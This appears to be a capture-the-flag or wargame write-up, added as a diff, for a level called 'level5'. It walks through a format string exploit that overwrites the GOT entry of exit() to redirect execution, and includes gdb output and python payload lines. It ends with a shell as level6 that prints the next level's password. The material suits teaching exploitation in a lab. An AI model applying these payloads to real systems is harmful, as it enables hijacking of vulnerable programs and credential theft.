@@ -1,0 +1,48 @@
+# Again, format string vulnerability !
+
+# Here we have to change the GOT address of exit so we can call our o
+#	function :)
+
+(gdb) info func
+All defined functions:
+[...]
+0x080483d0  exit@plt
+[...]
+
+(gdb) x/3i 0x080483d0
+=> 0x80483d0 <exit@plt>:	jmp    *0x8049838 # Here, address of exit in GOT
+   0x80483d6 <exit@plt+6>:	push   $0x28
+   0x80483db <exit@plt+11>:	jmp    0x8048370
+
+GOT address of "exit()" is 0x8049838
+
+python -c 'print "\x38\x98\x04\x08"+"%x%x%x"+"%n"' > /tmp/m # PUTS 17 TO GET EXIT@PLT
+
+(gdb) run < /tmp/m
+Starting program: /home/user/level5/level5 < /tmp/m
+Breakpoint 1, 0x080484f8 in n ()
+0x080483d0 in exit@plt ()
+(gdb)
+0x00000017 in ?? ()
+(gdb)
+
+# Nice, we changed the function exit, let's put the function o instead :)
+
+================================================================================
+
+# Since we have to write a pretty big value, we have to use the trick we used last level
+
+# We have to write 0x080484a4 (134513828) in 0x8049838
+
+python -c 'print "\x38\x98\x04\x08"+"%134513808x"+"%x%x"+"%n"' > /tmp/m
+(gdb) x/x 0x8049838
+0x8049838 <exit@got.plt>:	0x080484a4
+
+# We are good, let's run :) !
+
+cat /tmp/m - | ./level5
+[...]
+$ whoami
+level6
+$ cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
